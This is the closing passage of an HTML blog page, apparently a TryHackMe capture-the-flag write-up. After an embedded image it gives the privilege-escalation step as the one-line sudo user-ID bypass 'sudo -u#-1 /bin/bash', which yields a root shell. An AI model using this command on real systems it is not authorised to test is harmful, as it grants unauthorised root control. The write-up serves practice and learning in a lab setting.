ZfwMniucwJQxSQ9MWHfbytl7PYvi+SPQDqHfbddv4tFnsSA/gTitirjk8SzI0eGxt9GfQq3VD5jD7lou3zYxfdoows/LB8F98Qi/PGoHJERg7xs7ev+WYPu/NhCTt5TX5ic9xAz4GxuplSwseCwWr69fEgFESbzz9xhrJoaK69S68kkyA7ipre/EkDOXMQEGlEUEHkFGTm/Sc8m1ZFa+spT8CHNREd2EZOYFJLp6vGAwE9u3qflmO6Tkkib6etsf8JE2Pgk+uEmzOLnPPQYQPb1Z14OmGooyEiDgQ5R6638knx+9AZz2Dtw8WHChtry9N+SDisJcNvaWdVDwg4Ukdp0ZUr+TslOwVFzjs6tORmYYocvGZ40+huVkMoI+/ysHQvKSr1ZeoWPk4xQkifcZiMERjBOXsjlHoq5sB2UxK9g4y8j5/Ts5b/0+6yfq0GjCk4rT6QRiSdTdP1EhMCKTyfovqW30UTBRB6Kd2hs6Js9LIhCc7emoZsu/VIecG5NXxN8sevjNMpBHmvTsqKHsEliLpjIKkHHjcgEGPSZHDW/trITZy/iR2Qh04fISXnaEMJqcFCj5/AINqdPJNEu0XvmcT28Cw104Ycg1Xvfi5JOScryzv0dhjBexK4xT7uk3CCnz2fTCKf5z317+XgLQMDr/af5i4XBk7yAa8Ng4c8VH1lPZxAYiCSJBAAmT1k5to55Ja+IxqeqptSfyxDIDJq0cdoa+SqWit+juAQcFksiz6theb4eJadDYTIMmnbUpEiEZyeZc1r80leBQTKO7xymFgY7vFG9i7tdOegZcTez5QwWeacvZYNUg92WWq/qjEK2RuPhYMGv6ZkB1d18Y7Zz17NO0/c9HbP3dJQAMoyZTMNHEMbuKYDPdX5Tyy4/6QwANU+9ZiD6YlopjHFPP4tWpesRwCqzu029aLrDrvXosC5fz1+NiobORdw9+wJvyUn4yP+meEKLjUjW1ZLJunDCgDPDhPLJq0Zg4C9DGrR7gvm5VItuaDgebaSANvroG1gVkSwOe/oJAjMUQItKBriNcHkm1qKuJPW+fwJ69nE0LhqG686QwEWMGnD10myez5k8ngM/F7Qs9vfv0D7AZgoyoT2bFD3/E92Q/XR4NFqOXz3dXQ0w88UFHWiYVsdnaf30N2oiqg93YGtrx3PiYf3r945A9p3dv49OcBfy8KC2MfktUfVqOLXEe/zg1CY0UAFMuLy1s4G9LLnB5zmLyQjxIO2fOtWOZMgcrcsQPC2HTxmJaP9nP7zunsbkona8+2s1B4Uk2FSaCSoUxTNULYzPIwkZVVTtPzrv/cjQwOgur+Al1t9oRGyWsi5IHDU8eTUzau3ByenXExOnuXSCEg8PGzrdP45i0nE0LgycKQCZtdCIcv4bNb8Ui+wEJm60Nhj9BWiSrA1nE39ONHxBU4G6t4VQDjF6cHBoxaFTEavt7Emm5uIknni9mcvAqsu1zfrO3nskvvMCSkUENfmC/Jbw9gCAj+cW+UMqH5NcAXrwiIWGO31bNuS4LBY8nIg3Bnwl3qkXzgqpFFyVj0kpA+O4eIYtlC6v47UdH2KaZztycBIxeB001TZA/mxn9ulUl81h2D8fOXwJHCgvSB7El+ui81R66TTCSmGCMUGhfc+HkqGPb26exp87nh5MC2Jv73ayO+BExGIG4SflYT31IaWkN8XOSobmS0lqwPjOOOO7GXm5HO51eaPWIQA+tt9pD7HCrjrIWHeNGxCC47Jw5VUmzOZcf5xkJnYSHCFN009ruRpQ6cQOCq52WWxoEcxxJZg1ajRZdsOq1AloE9FotJm2ft3pov3VkTUyEI5Xs/cLIkrEx0HWdsk+aEFJmkxMyzj6qP7fhSZnDrNiBLjM8HmG1qJ+kJ1axKeY0752qYPtZN+iNJKVYeWbA+wBrbgp7D9YhZi0gezBTrhp27qwJ3abP4eWNM0kb7PgH8HUWTu6v6qntAWo+5o2Q5iTw1MvLmGUGWZ/OmrVz2f/eWbZuc4N5OJOWPMfKXOFu/IaTigMlfHjnO6l69u6sD7GDWsZ+vpwzjt6XICPSp7ChaDppcoTFh40V/KbEdvf/k6VsAYSJi/n5kpR7w6Z+44G728Pp9/D8Z9ioPs275SfYctwHeiOjs+fyygIrcfjuekFHDSebNVifzcQwxF+heYTVon0GBQM6nRa1Rt07IJIPn9s7IOY0YTRqUYk99LhDv8FU62Mx6AZZcchePE7PN1stqjVjMgy2PJfwOZ13q3LVOnQGPRqNGgJ9FZz+4Kv1VZve4/6D7Kh16A161Go1EEAWffi8XiL+bQ3BiMl4b6Aq++9Txas2YDRrEYN/SSWsfqtQaw1odQJqlQpkmYDkxe/1hbZZpccQo0d2d/WGAUNAqXFSiHqUBBOFqEcRqULUo4hUIepRRKoQ9SgiVYh6FJEqRD2KSBWiHkWkClGPIlKFqEcRqULUo4hUIepRRKoQ9SgiVYh6FJEqRD2KSBWiHkWkClGPIlKFqEcRqULUo4hUIepRRKoQ9SgiVYh6FJEqRD2KSBWiHkWkClHP/wJoaNuctCmz5QAAAABJRU5ErkJggg==" width="169" height="53"></p><p>--&gt; so the exploit was like :</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">sudo -u#-1 /bin/bash</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>--&gt; and i got root shell !</p><hr></div><footer class="row docusaurus-mt-lg blogPostDetailsFull_h6_j"><div class="col"><b>Tags:</b><ul class="tags_XVD_ padding--none margin-left--sm"><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/Cybernotes/blog/tags/stegnography">stegnography</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/Cybernotes/blog/tags/zip-2-john">zip2john</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/Cybernotes/blog/tags/user-agent">user-agent</a></li></ul></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/Cybernotes/blog/jack-of-all-trades"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">THM Jack-of-all-trades writeup</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Cybernotes/blog/anthem"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">THM Anthem writeup</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_cNA8 thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#nmap-results" class="table-of-contents__link toc-highlight">nmap results</a></li><li><a href="#dirsearch-results" class="table-of-contents__link toc-highlight">dirsearch results</a></li><li><a href="#ftp" class="table-of-contents__link toc-highlight">FTP</a></li><li><a href="#stegnography" class="table-of-contents__link toc-highlight">Stegnography</a></li><li><a href="#image-stegno" class="table-of-contents__link toc-highlight">Image stegno</a></li><li><a href="#privesc" class="table-of-contents__link toc-highlight">Privesc</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contributing</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/Cybernotes/docs/contributing">How to contribute</a></li></ul></div><div class="col footer__col"><div class="footer__title">Contact me</div><ul class="footer__items"><li class="footer__item"><a href="https://medium.com/@0xSH1V4M" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Medium<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://discord.gg/wXQAxT8X9d" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://twitter.com/0xSH1V4M" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a href="https://oxsh1v4m.gitbook.io/webdev-notes/getting-started/welcome" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Development notes<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://github.com/shivam1317" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 Cybernotes</div></div></div></footer></div>
<script src="/Cybernotes/assets/js/runtime~main.3f3644df.js"></script>
<script src="/Cybernotes/assets/js/main.6f91976f.js"></script>
</body>
</html>